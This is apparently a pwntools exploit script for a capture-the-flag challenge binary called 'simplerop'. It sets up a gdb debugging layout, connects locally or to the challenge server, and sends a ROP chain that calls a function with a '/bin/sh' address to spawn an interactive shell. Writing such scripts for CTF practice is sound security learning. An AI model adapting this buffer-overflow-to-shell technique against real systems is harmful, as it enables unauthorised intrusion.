from pwn import *

binary_path = "./simplerop"
lib_path = "/lib/x86_64-linux-gnu/"
#lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")


gs="""

set follow-fork-mode parent

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break * 0x401229
#break main

break * 0x401208

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.ctf.b01lers.com 1008
        return remote("chal.ctf.b01lers.com", 1008)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


io = start()

io.recvline()

rop = ROP(elf)

BINSH_ADDR = 0x402008

rop.call(0x4011df, [BINSH_ADDR])

io.sendline(flat({
    0x08: rop.chain()
}))

io.interactive()
